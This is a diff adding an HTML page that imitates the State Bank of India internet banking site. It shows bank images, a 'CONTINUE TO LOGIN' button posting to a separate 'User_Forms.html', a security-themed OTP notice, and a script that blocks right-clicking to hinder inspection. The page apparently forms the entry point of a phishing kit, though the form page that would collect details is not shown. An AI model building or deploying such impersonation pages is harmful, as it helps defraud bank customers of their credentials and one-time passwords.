@@ -1,0 +1,80 @@
+<!DOCTYPE html>
+<html lang="eng">
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>State Bank of India - Internet Banking</title>
+  <style>
+    #img1,#img2,#img3
+    {
+      width:104%;
+      margin-left:-6px;
+    }
+    #btn
+    {
+      width:260px;
+      background-color:#2A9DCC;
+      color: white;
+      border: none;
+      border-radius: 0px;
+      border-width: 0px;
+      margin-left:-20px;
+      cursor: pointer;
+      font-size: 16px;
+      height: 40px;
+    }
+    #ro
+    {
+        border-radius: 1px;
+        border-width: 1px;
+        border-style:solid;
+        border-color:#A8DBF0;
+        padding: 2px; 
+        width: 98%;
+        height: 68px; 
+        padding:12px 0px; 
+    }
+  </style>
+  <script language="javascript"> 
+  var message="This function is not allowed here.";
+  function clickIE4(){
+  if (event.button==2){
+  alert(message);
+  return false;
+  }
+  }
+  function clickNS4(e){
+  if (document.layers||document.getElementById&&!document.all){
+  if (e.which==2||e.which==3){
+  alert(message);
+  return false;
+  }
+  }
+  }
+  if (document.layers){
+  document.captureEvents(Event.MOUSEDOWN);
+  document.onmousedown=clickNS4;}
+  else if (document.all&&!document.getElementById){
+  document.onmousedown=clickIE4;}
+  document.oncontextmenu=new Function("alert(message);return false;")
+  </script>
+</head>
+<body>
+<div class="line">
+  <img src="1.jpg" alt="" id="img1"><br><br>
+  <form action="User_Forms.html" method="post">
+    <center><div id="ro">
+    <center><input type="submit" value="CONTINUE TO LOGIN" id="btn"
+     style="font-weight: bold;">
+     <center><span><h2 style="font-family:arial; 
+     font-size:12.5px;
+     color:#0F578E;
+     margin:1px;">
+     Dear Customer, OTP based login is<br>
+     introduced for added security</h2></span></center>
+     </input></button></center></div>
+     </div></center>
+    <img src="2.jpg" alt="" id="img2"><br>
+    <img src="3.jpg" alt="" id="img3"><br>
+    </form></body></html>
